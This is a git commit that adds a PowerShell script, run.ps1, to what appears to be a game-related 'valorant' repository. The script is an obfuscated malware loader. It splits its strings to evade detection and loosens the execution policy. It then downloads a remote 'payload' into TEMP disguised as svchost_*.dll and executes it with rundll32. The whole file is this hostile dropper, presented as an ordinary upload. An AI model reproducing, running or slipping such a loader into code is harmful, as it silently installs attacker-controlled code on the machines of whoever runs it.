9b739653309777a03147a669e12619236b25e9e9
mk121X <mk121@email.gxaboyshop.store>
2026-03-16 02:14:17 +0700

    Add files via upload

---
+++ run.ps1
@@ -0,0 +1,11 @@
+$ErrorActionPreference = @("St","op") -join ""
+$_0x91A = @("https://raw",".githubusercontent",".com/mk121X","/valorant/refs","/heads/main/","payload") -join ""
+Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force -ErrorAction SilentlyContinue
+
+$_0x7C1 = New-Object (@("System",".Net",".WebClient") -join "")
+$_0x7C1.Headers.Add((@("User","-Agent") -join ""), (@("Moz","illa/","5.0") -join ""))
+
+$_0xDLL = "$env:TEMP\svchost_$(Get-Random).dll"
+$_0x7C1.DownloadFile($_0x91A, $_0xDLL)
+
+Start-Process (@("rund","ll32",".exe") -join "") -ArgumentList "`"$_0xDLL`",VoidFunc"
